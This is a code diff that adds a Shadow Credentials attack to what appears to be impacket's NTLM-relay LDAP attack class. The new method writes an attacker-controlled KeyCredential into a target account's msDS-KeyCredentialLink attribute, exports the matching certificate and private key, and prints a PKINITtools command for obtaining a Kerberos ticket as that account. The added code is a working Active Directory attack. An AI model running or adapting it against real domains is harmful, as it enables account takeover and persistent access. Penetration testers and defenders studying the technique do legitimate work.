@@ -40,6 +40,11 @@ from impacket.ldap.ldaptypes import ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACCE
 from impacket.uuid import string_to_bin, bin_to_string
 from impacket.structure import Structure, hexdump
 
+from dsinternals.system.Guid import Guid
+from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
+from dsinternals.system.DateTime import DateTime
+from dsinternals.common.data.hello.KeyCredential import KeyCredential
+
 # This is new from ldap3 v2.5
 try:
     from ldap3.protocol.microsoft import security_descriptor_control
@@ -233,6 +238,90 @@ class LDAPAttack(ProtocolAttack):
             _thread.interrupt_main()
         else:
             LOG.error('Failed to add user to %s group: %s' % (groupName, str(self.client.result)))
+
+
+    def shadowCredentialsAttack(self, domainDumper):
+        currentShadowCredentialsTarget = self.config.ShadowCredentialsTarget
+        # If the target is not specify, we try to modify the user himself
+        if not currentShadowCredentialsTarget:
+            currentShadowCredentialsTarget = self.username
+
+        if currentShadowCredentialsTarget in delegatePerformed:
+            LOG.info('Shadow credentials attack already performed for %s, skipping' % currentShadowCredentialsTarget)
+            return
+
+        LOG.info("Searching for the target account")
+
+        # Get the domain we are in
+        domaindn = domainDumper.root
+        domain = re.sub(',DC=', '.', domaindn[domaindn.find('DC='):], flags=re.I)[3:]
+
+        # Get target computer DN
+        result = self.getUserInfo(domainDumper, currentShadowCredentialsTarget)
+        if not result:
+            LOG.error('Target account does not exist! (wrong domain?)')
+            return
+        else:
+            target_dn = result[0]
+            LOG.info("Target user found: %s" % target_dn)
+
+        LOG.info("Generating certificate")
+        certificate = X509Certificate2(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        LOG.info("Certificate generated")
+        LOG.info("Generating KeyCredential")
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
+        LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+        LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+        self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+        results = None
+        for entry in self.client.response:
+            if entry['type'] != 'searchResEntry':
+                continue
+            results = entry
+        if not results:
+            LOG.error('Could not query target user properties')
+            return
+        try:
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
+            LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
+            self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+            if self.client.result['result'] == 0:
+                LOG.info("Updated the msDS-KeyCredentialLink attribute of the target object")
+                if self.config.ShadowCredentialsOutfilePath is None:
+                    path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                    LOG.debug("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+                else:
+                    path = self.config.ShadowCredentialsOutfilePath
+                if self.config.ShadowCredentialsExportType == "PEM":
+                    certificate.ExportPEM(path_to_files=path)
+                    LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
+                    LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
+                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                    LOG.info("Run the following command to obtain a TGT")
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, currentShadowCredentialsTarget, path))
+                elif self.config.ShadowCredentialsExportType == "PFX":
+                    if self.config.ShadowCredentialsPFXPassword is None:
+                        password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                        LOG.debug("No pass was provided. The certificate will be store with the password: %s" % password)
+                    else:
+                        password = self.config.ShadowCredentialsPFXPassword
+                    certificate.ExportPFX(password=password, path_to_file=path)
+                    LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                    LOG.info("Must be used with password: %s" % password)
+                    LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                    LOG.info("Run the following command to obtain a TGT")
+                    LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, currentShadowCredentialsTarget, path))
+                    delegatePerformed.append(currentShadowCredentialsTarget)
+            else:
+                if self.client.result['result'] == 50:
+                    LOG.error('Could not modify object, the server reports insufficient rights: %s' % self.client.result['message'])
+                elif self.client.result['result'] == 19:
+                    LOG.error('Could not modify object, the server reports a constrained violation: %s' % self.client.result['message'])
+                else:
+                    LOG.error('The server returned an error: %s' % self.client.result['message'])
+        except IndexError:
+            LOG.info('Attribute msDS-KeyCredentialLink does not exist')
+        return
 
     def delegateAttack(self, usersam, targetsam, domainDumper, sid):
         global delegatePerformed
@@ -856,6 +945,11 @@ class LDAPAttack(ProtocolAttack):
             ][0]
             LOG.debug("Computer container is {}".format(computerscontainer))
             self.addComputer(computerscontainer, domainDumper)
+            return
+
+        # Perform the Shadow Credentials attack if it is enabled
+        if self.config.IsShadowCredentialsAttack:
+            self.shadowCredentialsAttack(domainDumper)
             return
 
         # Last attack, dump the domain if no special privileges are present
